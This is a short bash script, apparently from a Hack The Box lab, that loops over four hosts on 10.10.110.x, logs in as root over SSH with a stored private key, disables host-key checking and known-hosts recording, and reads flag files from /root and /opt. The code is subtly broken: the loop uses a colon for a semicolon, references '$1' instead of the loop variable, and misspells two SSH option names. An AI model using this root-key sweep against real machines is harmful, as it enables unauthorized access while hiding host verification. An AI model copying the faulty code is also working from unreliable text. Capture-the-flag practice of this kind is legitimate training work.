#!/bin/bash
for i in $(seq 105 108): do
	echo "10.10.110.$1"
	ssh -o "BatchMode=Yes" -o "StrictHostKeyChecking=no" \
	-o "GlobalKnownHostsKeyFile=/dev/null" -o "UserKnownHostsKeyFile=/dev/null"\
	-i ~/ctf/htb/bg/automas \
	root@10.10.110.$1 "cat /root/flag.txt; echo; cat /opt/flag.txt; echo" 2>/dev/null
done
